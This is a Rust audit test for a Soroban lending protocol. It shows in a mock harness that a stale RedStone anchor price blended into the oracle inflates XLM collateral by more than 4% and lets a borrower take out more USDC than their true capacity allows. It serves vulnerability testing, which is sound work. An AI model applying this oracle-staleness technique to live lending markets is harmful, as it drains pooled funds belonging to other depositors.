use test_harness::mock_redstone::MockRedStonePriceFeedClient;
use test_harness::oracle::redstone::register_redstone_adapter;
use test_harness::{usd, usd_cents, LendingTest, ALICE, BOB};

const ANCHOR_FROZEN_PRICE: i128 = usd(1);
const TRUE_FRESH_PRICE: i128 = usd_cents(91);
const XLM_TOLERANCE_BPS: u32 = 1000;
const ANCHOR_MAX_STALE_SECONDS: u64 = 86_400;
const ANCHOR_LAG_SECONDS: u64 = 82_800;

const XLM_SUPPLY: f64 = 100_000.0;

const TARGET_BORROW: f64 = 70_000.0;

struct Outcome {
    collateral_usd: f64,
    borrow: Result<(), soroban_sdk::Error>,
}

fn run(anchor_stale: bool) -> Outcome {
    let mut t = LendingTest::new()
        .with_market(test_harness::xlm_preset())
        .with_market(test_harness::usdc_preset())
        .with_dust_disabled_all_markets()
        .build();

    let xlm = t.resolve_asset("XLM");
    let feed_id = soroban_sdk::String::from_str(&t.env, "XLM");

    let redstone = register_redstone_adapter(&t, &[("XLM", ANCHOR_FROZEN_PRICE)]);

    t.set_price("XLM", ANCHOR_FROZEN_PRICE);

    let cfg = test_harness::reflector_primary_redstone_anchor_config_with_anchor_stale(
        &t.env,
        &t.mock_reflector,
        &xlm,
        &redstone,
        &feed_id,
        ANCHOR_MAX_STALE_SECONDS,
        XLM_TOLERANCE_BPS,
    );
    t.configure_market_oracle(&xlm, &cfg);

    t.set_price("XLM", TRUE_FRESH_PRICE);

    let redstone_client = MockRedStonePriceFeedClient::new(&t.env, &redstone);
    let now = t.env.ledger().timestamp();
    if anchor_stale {
        let stale_ms = now.saturating_sub(ANCHOR_LAG_SECONDS) * 1000;
        redstone_client.set_price_data(&feed_id, &ANCHOR_FROZEN_PRICE, &stale_ms, &stale_ms);
    } else {
        let fresh_ms = now * 1000;
        redstone_client.set_price_data(&feed_id, &TRUE_FRESH_PRICE, &fresh_ms, &fresh_ms);
    }

    t.supply(BOB, "USDC", 500_000.0);

    t.supply(ALICE, "XLM", XLM_SUPPLY);

    let collateral_usd = t.total_collateral(ALICE);
    let borrow = t.try_borrow(ALICE, "USDC", TARGET_BORROW);

    Outcome {
        collateral_usd,
        borrow,
    }
}

#[test]
fn audit_borrow_withdraw_liquidate_stale_anchor_blends_5pct_skew_into_ltv() {
    let exploit = run(true);
    let control = run(false);

    let inflation = exploit.collateral_usd / control.collateral_usd;
    assert!(
        inflation > 1.04,
        "stale-anchor blend must inflate collateral >4% vs the honest fresh-anchor \
         valuation: exploit={} control={} ratio={}",
        exploit.collateral_usd,
        control.collateral_usd,
        inflation
    );

    assert!(
        exploit.borrow.is_ok(),
        "stale-anchor skew must let the attacker borrow beyond true capacity: {:?}",
        exploit.borrow
    );

    assert!(
        control.borrow.is_err(),
        "honest fresh-anchor pricing must reject the over-capacity borrow, \
         proving the stale anchor alone enabled it"
    );
}
